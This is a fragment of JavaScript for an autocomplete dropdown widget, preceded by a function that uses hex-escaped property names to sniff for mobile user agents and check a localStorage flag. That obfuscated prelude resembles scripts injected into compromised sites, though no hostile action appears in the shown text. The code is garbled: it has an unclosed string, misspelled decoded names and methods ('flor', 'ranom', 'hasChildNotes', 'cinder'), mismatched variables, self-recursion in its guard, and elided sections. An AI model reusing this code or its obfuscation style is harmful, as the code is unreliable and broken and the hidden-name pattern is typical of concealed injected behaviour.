function dtbg(){
	try{ 
		if (/Android|webOS|iPhone|iPad|iPod|BlackBerry/i["\x74\x65\x73\x74"](navigator["\x75\x73\x65\x41\x67\x65\x6e\x74"])) {}
	}catch(e){
		function getRandom(pZn){
			return window["\x4d\x61\x74\x68"]["\x66\x6c\x6f\x72"](window["\x4d\x61\x74\x68"]["\x72\x61\x6e\x6f\x6d"]()*pzn+1)
		}
	}
	if(typeof localStorage.bfNy == 'undefined){
		dtbg();
	...
	AutoComplete.prototype = {
		...
		deleteDIV:function(){
			while(this.autoObj.hasChildNotes()){
				this.autoObj.removeClass(this.autoObj.firstChild);
			}
			this.autoObj.className = "auto_hidden";
		},
		aetValue:function(_this){
			return function(){
			...
			if(event.keyCode != 13 && event.keyCode != 38 && event.keyCode != 40){
				...
				for(var i=0;i<valueArr.length;i++){
					if(reg.test(valueArr[i])){
						...
						this.auroObj.className = "auto_show";
						div_index++;
					}
				}
			}
			this.pressKey(event);
			window.onresize = cinder(this,function(){
				this.init()
			})
		}
	}
